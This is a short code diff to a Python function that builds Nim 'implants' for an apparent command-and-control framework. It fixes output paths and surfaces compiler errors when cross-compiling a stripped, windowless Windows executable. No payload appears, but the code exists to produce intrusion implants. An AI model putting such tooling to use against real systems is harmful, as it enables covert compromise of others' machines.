@@ -550,7 +550,8 @@ def nimplant_HTTP():
     id = (''.join(random.choices(string.ascii_lowercase, k=4)))
     
     file_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant_HTTP.nim')
-    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
+    implant_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant')
+    final_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
     if os.path.exists(file_loc):
         shutil.copy(file_loc, f_name)
         shutil.move(f_name, implant_loc)
@@ -584,18 +585,22 @@ def nimplant_HTTP():
     with open(f'{implant_loc}/{f_name}', 'w') as f:
         f.write(RC_patch)
         f.close()
-    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
+    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{final_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
     for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
-        process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        process = subprocess.Popen(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         process.wait()
-    implant_loc = os.path.join(implant_loc, exe_file)
+    implant_loc = os.path.join(final_loc, exe_file)
     if os.path.exists(implant_loc):
         print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')   
+    
     else:
+        output = process.stdout.read()
+        print(output.decode('utf-8'))
         print(Fore.RED + '[-] An error occurred while compiling the implant')
-    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
+    
+    implant_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant')
     os.remove(f'{implant_loc}/{f_name}')
-
+    
 def resolve_ip(interface):
     
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
